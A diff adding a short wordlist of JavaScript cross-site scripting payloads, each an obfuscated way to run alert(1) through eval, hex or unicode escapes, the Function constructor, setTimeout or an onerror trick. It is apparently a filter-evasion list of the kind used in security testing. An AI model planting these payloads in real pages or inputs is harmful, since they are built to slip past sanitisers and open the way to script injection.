@@ -1,0 +1,16 @@
+alert(1)
+alert(String.fromCharCode(49))
+alert(/1/.source)
+eval('alert(1)')
+this['EvAL'.toLowerCase()]('aLErT(1)'.toLowerCase())
+(alert(1)).replace(/.+/,eval);
+\u0061\u006c\u0065\u0072\u0074(1)
+eval('\u00' + '6' + '1'+'le' + '\u0072' + 't(1)')
+eval('\141\154\145\162\164\50\61\51')
+eval('\x61\x6c\x65\x72\x74(1)')
+eval('\x61ler\x74(1)')
+top['a\x6Cert'](1)
+x='\x61\x6c\x65\x72\x74\x28\x31\x29';new Function(x)()
+setTimeout('alert(1)',0)
+setTimeout(\u0061\u006c\u0065\u0072\u0074(1),0);
+onerror=eval;throw'alert\x281\x29';
